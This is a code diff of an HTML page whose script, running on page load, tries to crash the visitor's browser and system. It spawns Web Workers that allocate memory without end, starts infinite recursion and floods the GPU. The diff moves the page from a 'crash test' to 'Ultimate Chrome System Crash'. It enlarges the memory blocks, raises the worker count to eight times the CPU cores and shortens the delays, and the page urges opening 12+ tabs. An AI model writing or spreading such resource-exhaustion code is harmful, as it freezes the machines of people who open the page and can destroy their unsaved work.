@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Crash Test - Forced Auto Crash</title>
+    <title>Ultimate Chrome System Crash</title>
 </head>
 <body>
-    <h1>Chrome Crash Test - Auto-Crash Enforced</h1>
-    <p>Open 12+ tabs to maximize effectiveness.</p>
+    <h1>Final Test - Full System Overload</h1>
+    <p>Open 12+ tabs for best results.</p>
 
     <script>
         function startWorker() {
-            let code = `let data = []; while (true) { data.push(new Float64Array(1e8)); }`;
+            let code = `let data = []; while (true) { data.push(new Float64Array(1e9)); }`; // Increased memory block size
             let blob = new Blob([code], { type: "application/javascript" });
             let worker = new Worker(URL.createObjectURL(blob));
         }
@@ -38,13 +38,13 @@
             floodGPU();
         }
 
-        let coreMultiplier = navigator.hardwareConcurrency * 6; // Increased to 6x CPU cores
+        let coreMultiplier = navigator.hardwareConcurrency * 8; // Increased to 8x CPU cores
         for (let i = 0; i < coreMultiplier; i++) {
-            setTimeout(startWorker, i * 200);
+            setTimeout(startWorker, i * 100); // Reduced delay for more rapid execution
         }
 
-        setTimeout(() => infiniteRecursion(), 5000); // Start recursion after 5 seconds
-        setTimeout(() => overloadGPU(), 5000); // Start GPU flood after 5 seconds
+        setTimeout(() => infiniteRecursion(), 2000); // Start recursion after 2 seconds (sooner)
+        setTimeout(() => overloadGPU(), 2000); // Start GPU flood after 2 seconds
     </script>
 </body>
 </html>
